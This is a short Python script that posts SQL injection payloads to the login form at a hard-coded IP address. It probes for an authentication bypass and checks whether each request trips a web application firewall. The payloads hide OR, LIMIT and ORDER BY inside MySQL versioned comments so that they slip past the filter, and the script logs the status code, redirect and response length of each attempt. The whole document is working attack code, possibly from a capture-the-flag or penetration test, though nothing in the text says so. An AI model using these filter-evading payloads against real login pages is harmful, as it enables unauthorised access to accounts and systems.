import requests

def test(payload, label=""):
    r = requests.post("http://52.66.177.113/login.php",
                       data={"username": payload, "password": "x"},
                       allow_redirects=False)
    waf = "BLOCKED" if "Suspicious input detected" in r.text else "clean"
    print(f"[{label or payload!r}] status={r.status_code} loc={r.headers.get('Location')} waf={waf} len={len(r.text)}")

test("'/*!50000OR*/'1'>'0'/*!50000LIMIT*/1#", "boolean-true-limit1-hash")
test("'/*!50000OR*/'1'>'0'/*!50000LIMIT*/1-- -", "boolean-true-limit1-dashcomment")
test("admin'/*!50000LIMIT*/1#", "admin-limit1-only")
test("'/*!50000OR*/'1'>'0'/*!50000ORDER*/ /*!50000BY*/ 1/*!50000LIMIT*/1#", "order-by-limit")
